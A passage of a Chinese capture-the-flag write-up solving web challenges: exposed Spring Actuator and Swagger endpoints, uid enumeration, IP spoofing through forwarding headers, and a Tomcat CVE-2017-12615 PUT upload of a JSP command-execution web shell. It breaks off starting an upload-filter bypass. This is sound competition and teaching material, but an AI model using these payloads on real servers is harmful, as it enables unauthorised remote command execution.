+<p class="my-4 leading-7"><img alt="postman" src="/static/image/web-4-1.5a6b34a6.png"/></p>
+<h2 id="web-5-actuator配置不当会发生什么呢" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-5-actuator配置不当会发生什么呢">#</a>web-5 Actuator配置不当会发生什么呢</h2>
+<p class="my-4 leading-7">访问spring默认actuator地址，在env中找到flag。</p>
+<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="https://actuator-ctfd.dun.mi.com/actuator/env" class="link-_707cf  link_3b154 inline-link_3b154">https://actuator-ctfd.dun.mi.com/actuator/env</a></p>
+<p class="my-4 leading-7"><img alt="actuator" src="/static/image/web-5-1.5a9fd646.png"/></p>
+<h2 id="web-6-接口文档在哪儿呢" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-6-接口文档在哪儿呢">#</a>web-6 接口文档在哪儿呢</h2>
+<p class="my-4 leading-7">猜测接口文档地址，spring比较常用的接口文档服务还是swagger，但是没有配置swagger-ui。</p>
+<p class="my-4 leading-7"><a target="_blank" rel="noopener noreferrer" href="https://api-doc-ctfd.dun.mi.com/v2/api-docs" class="link-_707cf  link_3b154 inline-link_3b154">https://api-doc-ctfd.dun.mi.com/v2/api-docs</a></p>
+<p class="my-4 leading-7">往下找有个flag-controller，post请求，需要一个boolean参数。</p>
+<p class="my-4 leading-7"><img alt="api-docs" src="/static/image/web-6-1.839b91dc.png"/></p>
+<p class="my-4 leading-7">构造请求，获取flag</p>
+<p class="my-4 leading-7"><img alt="postman再次" src="/static/image/web-6-2.5f5c79be.png"/></p>
+<h2 id="web-7-破解uid" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-7-破解uid">#</a>web-7 破解uid</h2>
+<p class="my-4 leading-7">简单试了一下，uid范围大概是1-99，写个程序遍历一下，看看输出什么</p>
+<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import requests
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">url = &quot;https://dior-ctfd.dun.mi.com/user?uid={}&quot;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">payload = {}
+</span><span style="display:block;padding:0 1.25rem">headers = {
+</span><span style="display:block;padding:0 1.25rem">    &#x27;authority&#x27;: &#x27;dior-ctfd.dun.mi.com&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;accept-language&#x27;: &#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;cache-control&#x27;: &#x27;max-age=0&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;cookie&#x27;: &#x27;xxx&#x27;, # TODO cookie
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-ch-ua&#x27;: &#x27;&quot;Chromium&quot;;v=&quot;104&quot;, &quot;/Not)A;Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;104&quot;&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-ch-ua-mobile&#x27;: &#x27;?0&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-ch-ua-platform&#x27;: &#x27;&quot;macOS&quot;&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-dest&#x27;: &#x27;document&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-mode&#x27;: &#x27;navigate&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-site&#x27;: &#x27;none&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-user&#x27;: &#x27;?1&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;upgrade-insecure-requests&#x27;: &#x27;1&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;
+</span><span style="display:block;padding:0 1.25rem">}
+</span><span style="display:block;padding:0 1.25rem">for uid in range(1, 100):
+</span><span style="display:block;padding:0 1.25rem">    response = requests.request(&quot;GET&quot;, url.format(uid), headers=headers, data=payload)
+</span><span style="display:block;padding:0 1.25rem">    print(uid, response.text)</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">在uid=77的时候发现flag</p>
+<p class="my-4 leading-7"><img alt="uid=77是个吉利的数字" src="/static/image/web-7-1.e495bf82.png"/></p>
+<h2 id="web-8-听说你也了解http" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-8-听说你也了解http">#</a>web-8 听说你也了解HTTP</h2>
+<p class="my-4 leading-7">先根据提示一步一步的构造请求，到最后一步需要本地IP才能访问，通过header伪造本地IP。</p>
+<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span class="token" style="color:var(--code-token-function)">curl</span><span> --location --request POST </span><span class="token" style="color:var(--code-token-string)">&#x27;https://httpheader-ctfd.dun.mi.com/?flag=i_want_it&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;authority: httpheader-ctfd.dun.mi.com&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;accept-language: zh-CN,zh;q=0.9,en;q=0.8&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;cache-control: max-age=0&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;cookie:xxx TODO cookie&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua: &quot;Chromium&quot;;v=&quot;104&quot;, &quot;/Not)A;Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;104&quot;&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua-mobile: ?0&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua-platform: &quot;macOS&quot;&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-dest: document&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-mode: navigate&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-site: none&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-user: ?1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;upgrade-insecure-requests: 1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Content-Type: application/json&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Proxy-Client-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Referer: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Forwarded: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Forwarded-For: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Forwarded: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Forwarded-Host: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-remote-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-remote-addr: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;True-Client-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Client-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Client-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Real-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Ali-CDN-Real-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Cdn-Src-Ip: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Cdn-Real-Ip: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;CF-Connecting-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;X-Cluster-Client-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;WL-Proxy-Client-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Proxy-Client-IP: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Fastly-Client-Ip: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;True-Client-Ip: 127.0.0.1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--form </span><span class="token" style="color:var(--code-token-string)">&#x27;flag=&quot;i_want_it&quot;&#x27;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">不知道哪个参数管用，一股脑全部设置成127.0.0.1吧</p>
+<h2 id="web-9-被清空的文件" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-9-被清空的文件">#</a>web-9 被清空的文件</h2>
+<p class="my-4 leading-7">下载.bash_history文件，从文件中找到flag</p>
+<p class="my-4 leading-7"><img alt="bash_history" src="/static/image/web-9-1.14bde0bc.png"/></p>
+<h2 id="web-10-一个安全配置引发的血案" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-10-一个安全配置引发的血案">#</a>web-10 一个安全配置引发的血案</h2>
+<p class="my-4 leading-7">该题使用 Tomcat 远程代码执行漏洞分析（CVE-2017-12615）</p>
+<blockquote class="border-l-2 border-solid border-divider pl-4 my-6 transition-colors duration-500 blockquote_3b154">
+<p class="my-4 leading-7">CVE-2017-12615漏洞利用需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。
+Apache Tomcat默认开启PUT方法，org.apache.catalina.servlets.DefaultServlet的readonly默认为true，而且默认没有在conf/web.xml里写，需要手工添加并且改为false，才可以测试。
+主要在conf文件夹的web.xml文件中添加readonly参数并设置值为false：</p>
+</blockquote>
+<div class="language-xml"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-xml" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span class="token" style="color:var(--code-token-punctuation)">&lt;</span><span class="token" style="color:var(--code-token-function)">init-param</span><span class="token" style="color:var(--code-token-punctuation)">&gt;</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>    </span><span class="token" style="color:var(--code-token-punctuation)">&lt;</span><span class="token" style="color:var(--code-token-function)">param-name</span><span class="token" style="color:var(--code-token-punctuation)">&gt;</span><span>readonly</span><span class="token" style="color:var(--code-token-punctuation)">&lt;/</span><span class="token" style="color:var(--code-token-function)">param-name</span><span class="token" style="color:var(--code-token-punctuation)">&gt;</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>    </span><span class="token" style="color:var(--code-token-punctuation)">&lt;</span><span class="token" style="color:var(--code-token-function)">param-value</span><span class="token" style="color:var(--code-token-punctuation)">&gt;</span><span>false</span><span class="token" style="color:var(--code-token-punctuation)">&lt;/</span><span class="token" style="color:var(--code-token-function)">param-value</span><span class="token" style="color:var(--code-token-punctuation)">&gt;</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span></span><span class="token" style="color:var(--code-token-punctuation)">&lt;/</span><span class="token" style="color:var(--code-token-function)">init-param</span><span class="token" style="color:var(--code-token-punctuation)">&gt;</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<p class="my-4 leading-7">根据要求，构造PUT请求，上传一句话，然后蚁剑连接，从目录中找到flag</p>
+<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span class="token" style="color:var(--code-token-function)">curl</span><span> --location --request PUT </span><span class="token" style="color:var(--code-token-string)">&#x27;https://tomcat-ctfd.dun.mi.com/sumy123123.jsp/&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;authority: tomcat-ctfd.dun.mi.com&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;accept-language: zh-CN,zh;q=0.9,en;q=0.8&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;cookie: xxxx TODO cookie&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua: &quot;Chromium&quot;;v=&quot;104&quot;, &quot;/Not)A;Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;104&quot;&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua-mobile: ?0&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-ch-ua-platform: &quot;macOS&quot;&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-dest: document&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-mode: navigate&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-site: none&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;sec-fetch-user: ?1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;upgrade-insecure-requests: 1&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--header </span><span class="token" style="color:var(--code-token-string)">&#x27;Content-Type: text/plain&#x27;</span><span> </span><span class="token" style="color:var(--code-token-punctuation)">\</span><span>
+</span></span><span style="display:block;padding:0 1.25rem"><span>--data-raw </span><span class="token" style="color:var(--code-token-string)">&#x27;&lt;%
+</span></span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  if(request.getParameter(&quot;cmd&quot;)!=null){
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">    java.io.InputStream in = Runtime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;,&quot;-c&quot;,request.getParameter(&quot;cmd&quot;)}).getInputStream();
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">    int a = -1;
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">    byte[] b = new byte[1];
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">    out.print(&quot;&lt;pre&gt;&quot;);
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">    while((a=in.read(b))!=-1){
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">      out.print(new String(b));
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">    }
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">    out.print(&quot;&lt;/pre&gt;&quot;);
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">  }
+</span><span style="display:block;padding:0 1.25rem;color:var(--code-token-string)" class="token">%&gt;&#x27;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="web-11-就一个上传操作能有啥问题" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-11-就一个上传操作能有啥问题">#</a>web-11 就一个上传操作能有啥问题</h2>
+<p class="my-4 leading-7">先上传一个图片简单的试了下，发现文件被放在upload目录下，并且页面可以访问到。而且文件名还是上传文件的文件名。文件类型只支持.jpg|.png|.gif，但是这个类型判断在前端页面判断。想办法绕过文件类型的判断，上传一句话，然后蚁剑连接，获取flag。</p>
+<p class="my-4 leading-7">构造一句话的php文件</p>
